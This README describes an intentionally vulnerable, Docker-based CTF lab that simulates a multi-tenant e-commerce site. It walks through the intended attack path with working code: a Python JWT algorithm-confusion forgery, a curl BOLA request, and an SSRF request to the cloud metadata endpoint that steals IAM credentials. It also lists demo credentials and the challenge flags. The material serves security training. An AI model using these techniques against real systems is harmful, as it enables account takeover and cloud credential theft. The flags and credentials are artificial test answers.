# NubeMarts — Vulnerable CTF Lab

> ⚠️ **INTENTIONALLY VULNERABLE.** Educational use only, on an isolated local
> machine. Never expose these services to a real network or the internet.

A mock multi-tenant e-commerce platform used to demonstrate a full cloud-app
attack chain: OSINT → auth bypass → BOLA → SSRF → cloud metadata theft.

## Services

| Service    | Stack                | Port   | Networks                 |
|------------|----------------------|--------|--------------------------|
| frontend   | React + Vite + Tailwind | 5173 | `ctf_public`             |
| backend    | Python + FastAPI     | 8000   | `ctf_public`, `ctf_internal` |
| mock-imds  | Nginx (alpine)       | —      | `ctf_internal` only (`169.254.169.254`) |

The `ctf_internal` network is `internal: true` with subnet `169.254.169.0/24`,
so the mock metadata service is **only** reachable from the backend — exactly
like AWS IMDS on a real EC2 instance.

## Run

```bash
cd nube-marts-ctf
docker compose up --build
```

- Frontend: http://localhost:5173
- Backend docs: http://localhost:8000/api/v1/docs

Demo credentials:
- `owner@pinturasdelsur.example` / `paint-it-blue` (admin)
- `hola@cafecentral.example` / `espresso123` (merchant)

## Flags

| Vuln | Flag |
|------|------|
| BOLA | `FLAG{BOLA_m3rch4nt_pwn3d}` |
| SSRF → IMDS | `FLAG{SSRF_c10ud_m3t4d4t4_h1j4ck}` |

## Intended attack path

### 0. OSINT (recon)
`vite.config.js` ships with `sourcemap: true` and `minify: false`, so the
browser bundle leaks `src/api.js`, which documents:
- backend URL `http://localhost:8000`
- `GET /api/v1/swagger.json`
- `GET /public.pem`
- the Pinturas del Sur UUID.

### 1. JWT algorithm confusion (RS256 → HS256)
The backend verifies tokens with the **public** key but does not pin the
algorithm. Download the public key and forge an HS256 admin token using the
PEM text as the HMAC secret:

```python
import jwt, requests, datetime
pub = requests.get("http://localhost:8000/public.pem").text
tok = jwt.encode(
    {
      "sub": "attacker",
      "role": "admin",
      "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=1),
    },
    pub,                 # public key used as symmetric secret
    algorithm="HS256",
)
print(tok)
```

### 2. BOLA — read any merchant's invoices
The endpoint requires `role: admin` but never checks token ownership:

```bash
curl -H "Authorization: Bearer $TOK" \
  http://localhost:8000/api/v1/merchants/a1b2c3d4-0000-0000-0000-000000000001/payout-invoices
# -> FLAG{BOLA_m3rch4nt_pwn3d}
```

### 3. SSRF → cloud metadata
The import endpoint fetches any URL server-side and returns the body. Pivot
through the backend (which sits on `ctf_internal`) to the metadata service:

```bash
curl -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
  -d '{"image_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/role"}' \
  http://localhost:8000/api/v1/product/import
# -> SecretAccessKey: FLAG{SSRF_c10ud_m3t4d4t4_h1j4ck}
```

## Teardown

```bash
docker compose down
```
